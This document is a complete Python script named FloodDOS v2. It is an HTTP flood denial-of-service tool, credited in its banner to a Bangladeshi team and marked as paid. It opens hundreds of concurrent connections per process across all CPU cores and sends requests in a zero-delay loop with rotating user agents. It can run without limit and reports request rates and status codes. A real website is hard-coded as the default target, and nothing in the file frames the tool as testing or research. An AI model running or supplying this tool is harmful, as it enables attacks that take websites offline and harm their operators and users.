#!/usr/bin/env python3
"""
FloodDOS v2 - Unlimited | Zero-Latency | Multi-Process | Live Data Collecting
Usage: python3 flooddos.py [url] [-c CONCURRENCY] [-p PROCESSES] [-d SECONDS]
Deps: pip install aiohttp
"""

import sys
import time
import asyncio
import random
import queue
import threading
import multiprocessing
from collections import Counter
from urllib.parse import urlparse

try:
    import aiohttp
    from aiohttp import ClientTimeout, TCPConnector
except ImportError:
    print("[!] aiohttp not installed -> pip install aiohttp")
    sys.exit(1)

BANNER = r'''
  █████▒██▓     ▒█████   ▒█████  ▓█████▄ ▓█████▄  ▒█████    ██████ 
▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
           ░  ░    ░ ░      ░ ░     ░       ░        ░ ░        ░  
                                  ░       ░                        
===============================================================
 [✓] Owner : Dhul-Qarnayn Ibn Tawhid Abdullah
 [✓] Team : Mus'adul Mahdi Ansarullah Bangladesh - MMAB
 [✓] Region : Bangladesh
 [✓] Tool Name : FloodDOS
 [✓] Tool Status: Paid
===============================================================
'''

def show_logo():
    print(BANNER)

def get_port(url):
    parsed = urlparse(url)
    if parsed.port:
        return parsed.port
    return 443 if parsed.scheme == "https" else 80

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
]

def random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
    }

async def hitter(session, urls, stats, stop):
    """Zero-delay persistent hit loop with per-request data collection."""
    while not stop.is_set():
        url = random.choice(urls)
        t0 = time.monotonic()
        try:
            async with session.get(
                url,
                headers=random_headers(),
                timeout=ClientTimeout(total=5),
                tcp_nodelay=True,          # Nagle off -> packets send instantly
            ) as resp:
                await resp.read()          # drain body -> connection returns to pool
                dt = time.monotonic() - t0
                stats['sent'] += 1
                stats['lat_sum'] += dt
                stats['codes'][resp.status] = stats['codes'].get(resp.status, 0) + 1
                stats['urls'][url] = stats['urls'].get(url, 0) + 1
        except TimeoutError:
            stats['timeouts'] += 1
            stats['errors'] += 1
        except (aiohttp.ClientError, OSError, ConnectionError):
            stats['errors'] += 1
            await asyncio.sleep(0.01)      # tiny backoff ONLY on hard connection failure
        # success path: NO sleep -> zero-latency tight loop

async def stats_reporter(stats, q):
    """Push per-second data snapshots to the parent process."""
    while True:
        await asyncio.sleep(1)
        q.put({
            'sent': stats['sent'],
            'errors': stats['errors'],
            'timeouts': stats['timeouts'],
            'codes': dict(stats['codes']),
            'urls': dict(stats['urls']),
            'lat_sum': stats['lat_sum'],
        })
        stats['sent'] = 0
        stats['errors'] = 0
        stats['timeouts'] = 0
        stats['codes'] = {}
        stats['urls'] = {}
        stats['lat_sum'] = 0.0

async def run_loop(urls, concurrency, q, duration):
    stats = {'sent': 0, 'errors': 0, 'timeouts': 0, 'codes': {}, 'urls': {}, 'lat_sum': 0.0}
    stop = asyncio.Event()
    connector = TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        hitters = [asyncio.create_task(hitter(session, urls, stats, stop)) for _ in range(concurrency)]
        reporter = asyncio.create_task(stats_reporter(stats, q))
        if duration and duration > 0:
            await asyncio.sleep(duration)
            stop.set()
            await asyncio.sleep(0.5)       # drain in-flight requests
        else:
            await asyncio.sleep(86400)     # unlimited - runs until process is killed
        for t in hitters:
            t.cancel()
        reporter.cancel()

def worker(urls, concurrency, q, duration):
    try:
        asyncio.run(run_loop(urls, concurrency, q, duration))
    except (KeyboardInterrupt, SystemExit):
        pass

def stats_consumer(q, stop_flag, summary):
    """Parent-side collector: aggregates all process data -> live report."""
    codes = Counter()
    urls = Counter()
    total_sent = total_errors = total_timeouts = 0
    lat_sum = lat_n = 0.0
    peak = 0.0
    last_time = time.monotonic()
    last_sent = 0
    header_printed = False

    while not stop_flag.is_set():
        try:
            s = q.get(timeout=0.5)
        except queue.Empty:
            continue
        total_sent += s['sent']
        total_errors += s['errors']
        total_timeouts += s['timeouts']
        codes.update(s['codes'])
        urls.update(s['urls'])
        lat_sum += s['lat_sum']
        lat_n += s['sent']
        now = time.monotonic()
        if now - last_time >= 1.0:
            if not header_printed:
                print("\n[LIVE DATA]  time     |   req/s  |   total   | errors | timeout | avg_lat(ms) | top_status")
                header_printed = True
            rate = (total_sent - last_sent) / (now - last_time)
            peak = max(peak, rate)
            avg_lat = (lat_sum / lat_n * 1000.0) if lat_n else 0.0
            top = " ".join(f"{k}:{v}" for k, v in codes.most_common(3)) or "-"
            print(f"             {time.strftime('%H:%M:%S')} | {rate:7.0f} | {total_sent:8d} | "
                  f"{total_errors:5d} | {total_timeouts:6d} | {avg_lat:9.2f} | {top}", flush=True)
            last_time = now
            last_sent = total_sent
            lat_sum = 0.0
            lat_n = 0

    summary['codes'] = codes
    summary['urls'] = urls
    summary['total_sent'] = total_sent
    summary['total_errors'] = total_errors
    summary['total_timeouts'] = total_timeouts
    summary['peak'] = peak

def main():
    show_logo()

    # --- minimal CLI parsing ---
    args = sys.argv[1:]
    url = "https://zarir.org"
    concurrency = 500
    processes = multiprocessing.cpu_count()
    duration = 0
    i = 0
    while i < len(args):
        a = args[i]
        if a in ("-c", "--concurrency") and i + 1 < len(args):
            concurrency = int(args[i + 1]); i += 2
        elif a in ("-p", "--processes") and i + 1 < len(args):
            processes = int(args[i + 1]); i += 2
        elif a in ("-d", "--duration") and i + 1 < len(args):
            duration = int(args[i + 1]); i += 2
        elif a in ("-h", "--help"):
            print("Usage: python3 flooddos.py [url] [-c CONCURRENCY] [-p PROCESSES] [-d SECONDS]")
            return
        else:
            url = a; i += 1

    urls = [u.strip() for u in url.split(",") if u.strip()]
    ports = {u: get_port(u) for u in urls}
    total_conns = concurrency * processes

    print(f"[*] Target(s)      : {urls}")
    print(f"[*] Port(s)        : {ports}")
    print(f"[*] Concurrency    : {concurrency}/process x {processes} processes = {total_conns} connections")
    print(f"[*] Requests       : UNLIMITED (Ctrl+C to stop)")
    print(f"[*] Delay          : ZERO (tight loop, TCP_NODELAY on)")

    q = multiprocessing.Queue()
    stop_flag = threading.Event()
    summary = {}
    consumer = threading.Thread(target=stats_consumer, args=(q, stop_flag, summary), daemon=True)
    consumer.start()

    procs = [
        multiprocessing.Process(target=worker, args=(urls, concurrency, q, duration), daemon=True)
        for _ in range(processes)
    ]
    for p in procs:
        p.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping all processes...")
    finally:
        stop_flag.set()
        for p in procs:
            p.terminate()
        consumer.join(timeout=2)
        q.close()
        q.join_thread()

        # --- FINAL REPORT ---
        total = summary.get('total_sent', 0)
        print("\n============== FINAL REPORT ==============")
        print(f"Total requests  : {total}")
        print(f"Peak rate       : {summary.get('peak', 0):.0f} req/s")
        print(f"Errors          : {summary.get('total_errors', 0)}")
        print(f"Timeouts        : {summary.get('total_timeouts', 0)}")
        print(f"Status codes    : {dict(summary.get('codes', Counter()))}")
        print(f"Per-URL hits    : {dict(summary.get('urls', Counter()))}")
        print("==========================================")

if __name__ == "__main__":
    main()
